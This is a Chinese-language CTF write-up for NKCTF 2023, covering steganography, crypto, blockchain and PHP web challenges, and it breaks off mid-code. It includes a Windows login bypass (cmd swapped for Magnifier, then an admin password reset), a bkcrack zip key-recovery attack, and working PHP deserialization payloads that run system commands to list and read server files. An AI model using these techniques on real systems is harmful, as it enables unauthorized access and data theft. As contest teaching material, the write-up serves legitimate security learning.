    <content type="html"><![CDATA[<p>rank：15<br><img src="/img/blog_img/NKCTF/page_Image/png0.png" srcset="/img/loading.gif" lazyload alt=""></p><h1 id="Misc">Misc</h1><h2 id="hard-misc">hard-misc</h2><p><code>base32</code>，公众号发<code>NKCTF2023我来了！</code></p><h2 id="blue">blue</h2><p>先导入进vmware，开机发现是windows2008系统，用户带密码</p><p>挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符</p><p><img src="/img/blog_img/NKCTF/page_Image/png1.png" srcset="/img/loading.gif" lazyload alt=""></p><p>复制一份cmd到放大镜</p><p><img src="/img/blog_img/NKCTF/page_Image/png2.png" srcset="/img/loading.gif" lazyload alt=""></p><p>左下角启动放大镜功能后就启动了cmd，修改administrator密码</p><p><img src="/img/blog_img/NKCTF/page_Image/png3.png" srcset="/img/loading.gif" lazyload alt=""></p><p>进入系统</p><p><img src="/img/blog_img/NKCTF/page_Image/png4.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="easymusic">easymusic</h2><p>根据提示百度，搜到类似的一题<a href="https://cloud.tencent.com/developer/article/1676153">2020天翼杯-音频隐写</a></p><p>使用<code>OpenPuff</code>工具</p><p>文件尾得到<code>psdC:01374890</code></p><p>其他两个密码暂时没找到，但是一看这题的<code>psdC</code>和天翼杯的<code>psdC</code>一样，盲猜A和B也一样</p><p>导出flag.txt</p><p><img src="/img/blog_img/NKCTF/page_Image/png5.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="easy-rgb">easy_rgb</h2><p>montage+gaps画图<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p><p>得到key：<code>NKCTF2023</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png6.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>r</code>,<code>g</code>,<code>b</code>转成<code>zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>得到hint：<code>AES-128</code>和data：<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p><p>在线aes-128解密，key为<code>NKCTF2023</code></p><h2 id="first-spam-of-rabbit-year">first spam of rabbit year</h2><p><a href="">垃圾邮件</a>解密得到<code>佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫</code></p><p>社会主义核心价值观解密得到<code>rabbit 又 move</code></p><p>佛曰加个又，key是<code>rabbit</code>，解密得到密文</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure><p>0宽得到key：<code>EnoOoO1G</code></p><p>根据结尾的提示，密文rot47，key rot13</p><p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p><p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p><h2 id="misc-iot">misc?iot!</h2><blockquote><p><a href="https://www.anquanke.com/post/id/229321">https://www.anquanke.com/post/id/229321</a></p></blockquote><p>选择<code>arm little-endian</code></p><p>如果要写地址默认为<code>0x8000000</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png7.png" srcset="/img/loading.gif" lazyload alt=""></p><p>sub_800014C是rc4生成密钥的过程</p><p><img src="/img/blog_img/NKCTF/page_Image/png8.png" srcset="/img/loading.gif" lazyload alt=""></p><p>复制密钥的过程，得到key：<code>NKCTF2023</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png9.png" srcset="/img/loading.gif" lazyload alt=""></p><p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png10.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p><h2 id="easy-word">easy_word</h2><p>根据注释中的提示爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure><p>改成zip解压，<code>media</code>目录下有一张<code>image1.png</code>，图片上有key：<code>Welcome_to_NKCTF</code></p><p><code>cloacked-pixel</code>得到flag</p><p><img src="/img/blog_img/NKCTF/page_Image/png11.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="三体">三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure><p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p><h2 id="easy-bmp">easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png12.png" srcset="/img/loading.gif" lazyload alt=""></p><p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p><p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p><h2 id="baby-music">baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p><p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p><p>二进制转文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>发现是<code>zip</code></p><p>注释中<code>0</code>转为<code>.</code>，<code>1</code>转为<code>-</code>，<code>换行</code>转为<code>/</code></p><p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p><p>解摩斯得到<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p><p>根据提示，猜测是深入明文攻击</p><p>先构造已知的明文，即<code>flag.png</code>的文件头加<code>IHDR</code>，写入到<code>plain.txt</code></p><p>plain.txt：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p><p>使用<code>bkcrack</code>爆破key</p><p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p><p>修改<code>flag.zip</code>的密码</p><p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png13.png" srcset="/img/loading.gif" lazyload alt=""></p><p>解压得到flag</p><p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p><h2 id="THMaster">THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p><p>ce修改分数到2亿多</p><p><img src="/img/blog_img/NKCTF/page_Image/png14.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p><h1 id="Blockchain">Blockchain</h1><h2 id="SignIn">SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p><p><img src="/img/blog_img/NKCTF/page_Image/png15.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="HelloWorld">HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p><p>查看合约代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>setGreeting</code>改<code>greeting</code>的值即可</p><p>在<code>metamask</code>中链接题目给的私链</p><p><img src="/img/blog_img/NKCTF/page_Image/png16.png" srcset="/img/loading.gif" lazyload alt=""></p><p>使用<code>remix ide</code></p><p>编译后指定题目部署的地址</p><p>调用<code>setGreeting</code>，参数输出字符串<code>&quot;Hello,NKCTF2023&quot;</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png17.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在Metamask确认交易请求</p><p>等待交易打包，确认上链</p><p><img src="/img/blog_img/NKCTF/page_Image/png18.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="decompile-revenge">decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p><p><img src="/img/blog_img/NKCTF/page_Image/png19.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p><h1 id="web">web</h1><h2 id="baby-php">baby_php</h2><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p><p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p><p>列目录：<code>dir /</code></p><p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png20.png" srcset="/img/loading.gif" lazyload alt=""></p><p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png21.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="eazy-php">eazy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span 